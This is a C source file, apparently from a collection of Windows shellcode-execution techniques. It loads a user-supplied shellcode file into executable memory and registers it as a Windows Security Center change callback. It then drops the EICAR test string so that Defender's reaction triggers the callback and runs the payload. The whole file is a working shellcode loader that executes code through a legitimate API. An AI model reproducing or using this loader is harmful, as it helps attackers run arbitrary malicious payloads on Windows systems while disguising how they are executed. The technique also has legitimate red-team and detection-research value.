// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Wscapi.lib")

#include <stdio.h>
#include <windows.h>
#include <wscapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	HANDLE hFile = NULL;
	DWORD dwWritten = 0;
	HANDLE hCallbackReg = NULL;

	if (argc != 2)
	{
		printf("Usage: WscRegisterForChanges.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	// Register the callback for execution
	WscRegisterForChanges(NULL, &hCallbackReg, hAlloc, NULL);

	// Create a file containing the eicar test string for Defender to detect
	hFile = CreateFile( L"C:\\Windows\\Temp\\eicar.txt", GENERIC_WRITE,
		0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	
	if (hFile == INVALID_HANDLE_VALUE || hFile == NULL)
		goto CLEANUP;

	char eicar[] = {'X','5','O','!','P','%','@','A','P','[','4','\\','P','Z','X','5','4','(','P','^',')','7','C','C',')','7','}','$','E','I','C','A','R','-','S','T','A','N','D','A','R','D','-','A','N','T','I','V','I','R','U','S','-','T','E','S','T','-','F','I','L','E','!','$','H','+','H','*', '\0'};

	Ret = WriteFile( hFile, eicar,
		sizeof(eicar), &dwWritten, NULL);

	// Close the handle so defender can begin quarantine process.
	CloseHandle(hFile);
	
	//Wait for the execution
	if (Ret)
	{
		Sleep(20 * 1000);
	}
	else
	{
		printf("[!] Failed to write the eicar test string. Exiting...");
	}
	
CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hCallbackReg != NULL && hCallbackReg != INVALID_HANDLE_VALUE)
		WscUnRegisterChanges(hCallbackReg);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}